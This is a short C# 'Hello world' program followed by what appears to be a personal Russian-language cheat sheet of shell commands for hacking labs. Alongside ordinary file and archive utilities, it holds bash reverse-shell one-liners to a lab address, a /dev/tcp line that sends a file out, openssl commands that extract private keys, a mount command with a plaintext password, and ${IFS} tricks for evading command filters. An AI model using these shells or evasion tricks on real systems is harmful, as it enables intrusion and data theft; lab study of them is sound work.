using System;

class Program
{
    static void Main()
    {
        Console.WriteLine("Привет, мир!");
    }
}

# Размер директорий с содержимым Linux

du -hs *

# Извлекает файлы из файлов 

binwalk -e king   

# Подсчет символов в стандартном вводе

grep qwerty | wc -c ---> 6

# метаданные

exiftool file

# Строки ASCII из файла

strings file

# Разархивировать 

 7z x application.zip  

# кодировка base64

base64 -d (file.txt или стандартный вывод)

# перевод в 16 формат

cat password_backup | xxd > bak
 
 и обратно
 
cat password_backup | xxd -r > bak

# маленький броузер

curl -s http://10.10.10.150/secret.txt | base64 -d

# Архиваторы

bzip2 -d bak

file bak.out

mv bak.out bak.gz

gzip -d bak.gz

file bak

bzip2 -d bak

file bak.out

tar -xvf bak.out (извлечение)

tar -tvf bak.out (просмотр)

# утилита шифрования openssl

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes  (рашифровывает формат pfx)  (извлечение ключей)

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem (извлечение сертификата windows)

# просмотр всех каталогов и файлов в том числе скрытых Windows

gci -force .

# Docker

dive docker-archive://image.tar

# AWK 

cat passwd | awk '{ print $1 }' > users
cat passwd | awk '{ print $3 }' > passwords

cat hash.txt | awk -F: {'print $1'}

# Монтирование удаленной файловой системы к текущей файловой системе

    mkdir /mnt/data/
    sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/Data /mnt/data/

cifs - Common Internet File System

# FIND

    find . -type f

# Обратная оболочка bash

    bash -i >& /dev/tcp/10.10.14.7/9001 0>&1 

    bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'
    
    cat file > /dev/tcp/ip/port
    
# ПРослушивание через tcpdump и передача в wireshark

ssh 10.10.14.7@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" | wireshark -k -i -

(laba - light)


# Обфускация пробелов 

echo “${IFS}test”

ip${IFS}a;

{echo,test}
